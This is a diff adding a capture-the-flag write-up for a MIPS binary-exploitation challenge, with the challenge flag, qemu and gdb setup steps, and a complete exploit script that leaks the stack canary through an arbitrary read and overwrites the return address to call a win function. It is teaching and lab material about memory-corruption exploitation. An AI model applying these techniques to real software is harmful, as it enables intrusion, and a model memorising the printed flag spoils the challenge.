@@ -1146,3 +1146,68 @@ sleep(6)
 
 interactive()
 ```
+
+## MIPS
+
+### Challenge Information
+<Challenge
+  authors={["Legoclones"]}
+  category="pwn"
+  description="Pwn mains need to learn more about other architectures."
+  flag="byuctf{h0p3_y0u_d1dnt_h4v3_un1c0rn_2.1.3_cuz_M1PS_s3gf4ultz_th3r3}"
+></Challenge>
+
+### Solution
+
+This challenge is not too hard, but this is the first time I have to deal with MIPS architecture, so I have to learn a bit about it. First we need to setup the environment for it. Following these step:
+
+- Build the docker image to get `libc` and `ld`
+- Create a `rootfs` folder to store the `libc` and `ld` files
+- Execute the binary using: `qemu-mipsel -L rootfs ./mips`
+
+If you want to debug with `gdb` you can use `qemu-mipsel -L rootfs -g 1234 ./mips` and then connect to it with `gdb-multiarch` using `target remote localhost:1234`.
+And the idea to pwn this challenge is leak the canary, and ret2win. In mips architecture, the canary value address is stored in `__stack_chk_fail` function, that's the idea to leak the canary value. After that, we can use `ret2win` to call the `win` function.
+
+```py title="exploit.py" collapse={1-19}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+# context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./mips_patched', checksec=False)
+libc = exe.libc
+
+def start(argv=[]):
+    if args.GDB:
+        return process(["qemu-mipsel","-g","5000", "-L", "./rootfs", exe.path])
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    else:
+        return process(["qemu-mipsel", "-L", "./rootfs", exe.path])
+
+# ==================== EXPLOIT ====================
+p = start()
+
+win               = 0x0400964
+__stack_chk_guard = 0x0420060
+
+# Leak canary address
+sla(b'> ', b'1')
+sla(b'read from: ', str(hex(__stack_chk_guard)).encode())
+canary_address = int(rl()[:-1], 16)
+success('canary address @ %#x', canary_address)
+
+# Leak canary value
+sla(b'> ', b'1')
+sla(b'read from: ', str(hex(canary_address)).encode())
+canary = int(rl()[:-1], 16)
+success('canary @ %#x', canary)
+
+sla(b'> ', b'2')
+sla(b'name:\n', b'A'*0x10 + p32(canary) + p32(0) + p32(win))
+
+interactive()
+```
